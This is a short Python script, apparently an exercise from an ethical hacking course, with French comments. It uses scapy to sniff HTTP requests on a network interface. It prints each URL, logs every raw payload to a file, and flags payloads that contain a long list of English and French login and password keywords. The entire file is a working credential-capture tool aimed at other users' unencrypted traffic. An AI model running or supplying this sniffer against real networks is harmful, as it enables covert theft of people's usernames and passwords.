#!/usr/bin/python3

import scapy.all as scapy
from scapy_http import http
from termcolor import colored

def sniff(interface):
	scapy.sniff(iface=interface, store=False, prn=process_packets) #store on stocke rien ici,  prn= fonction appelee pour process nos packets

def process_packets(packet): #on va voir si notre packet a le layer http, on va chercher http request car c'est la qu'il y a le login, la reponse est si on a reussi a se log ou pas
	if packet.haslayer(http.HTTPRequest):
		url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path #hote = le site, path = l'endroit ou on se logue, il peut y en avoir plusieurs pour un seul site
		print(colored(url, 'magenta'))
		if packet.haslayer(scapy.Raw): #les username and password st dans load qui est dans raw
			load = packet[scapy.Raw].load
			#print("load: " + str(load))
			loadfile.write(str(load) + '\n')
			for i in words:
				if i in str(load): #on cherche les words qu'on a choisis
					print(colored(load, 'grey', 'on_yellow', attrs=['bold']))
					break #quite la loop

global loadfile
loadfile = open('/home/kamui/Documents/Ethical hacking course/Section 2/localnetworkprograms/loadfile.txt','a')
words = ["Login", "log in", "Log in", "Pseudo", "pseudo", "Identifiants", "identifiants", "identifiant", "Identifiant", "Mot de passe", "mot de passe", "mdp", "ID", "Id", "id", "email", "mail", "adresse mail", "usr", "pwd", "User name:", "User name", "Password:", "password:", "Password :", "Username:", "Username :", "password", "user", "username", "login", "pass", "User", "Password"] #les mots qu'on attend dans la partie load
sniff("eth0")
